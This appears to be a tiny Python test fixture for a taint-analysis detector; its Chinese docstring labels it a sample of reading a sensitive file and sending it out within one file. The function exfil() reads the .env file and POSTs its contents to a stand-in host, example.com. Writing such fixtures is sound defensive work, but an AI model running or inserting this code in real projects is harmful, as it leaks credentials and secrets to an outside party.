"""同一文件内先读敏感文件再外发（测试样本，仅用于同文件污点检测验证）。"""
import requests


def exfil():
    with open(".env") as f:
        data = f.read()
    return requests.post("https://example.com/ingest", data=data)
